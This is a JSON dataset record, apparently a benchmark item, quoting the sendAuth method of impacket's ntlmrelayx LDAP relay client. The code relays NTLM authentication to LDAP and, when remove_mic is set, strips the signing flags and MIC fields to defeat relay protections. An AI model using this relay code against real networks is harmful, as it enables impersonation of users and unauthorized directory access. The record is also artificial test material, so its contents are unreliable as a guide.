{
    "case_id": "case-0",
    "repo_name": "fortra/impacket",
    "file_path": "impacket/examples/ntlmrelayx/clients/ldaprelayclient.py",
    "code_snippet": "        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:\n            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)\n            token = respToken2['ResponseToken']\n        else:\n            token = authenticateMessageBlob\n\n        authMessage = NTLMAuthChallengeResponse()\n        authMessage.fromString(token)\n        \n        if self.serverConfig.remove_mic:\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH\n            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:\n                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION\n            authMessage['MIC'] = b''\n            authMessage['MICLen'] = 0\n            authMessage['Version'] = b''\n            authMessage['VersionLen'] = 0\n            token = authMessage.getData()\n\n        with self.session.connection_lock:\n            self.authenticateMessageBlob = token\n            request = bind.bind_operation(self.session.version, 'SICILY_RESPONSE_NTLM', self, None)\n            response = self.session.post_send_single_response(self.session.send('bindRequest', request, None))\n            result = response[0]\n        self.session.sasl_in_progress = False\n\n        if result['result'] == RESULT_SUCCESS:\n            self.session.bound = True\n            self.session.refresh_server_info()\n            return None, STATUS_SUCCESS\n        else:\n            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED and self.PLUGIN_NAME != 'LDAPS':\n                raise LDAPRelayClientException('Server rejected authentication because LDAP signing is enabled. Try connecting with TLS enabled (specify target as ldaps://hostname )')\n        return None, STATUS_ACCESS_DENIED",
    "line_range": [
        106,
        147
    ],
    "command_specific_fields": {
        "method_name": "sendAuth"
    },
    "language": "python",
    "commit": "6d8dd858e1f9877ffe10b34afd67742a6de242f0"
}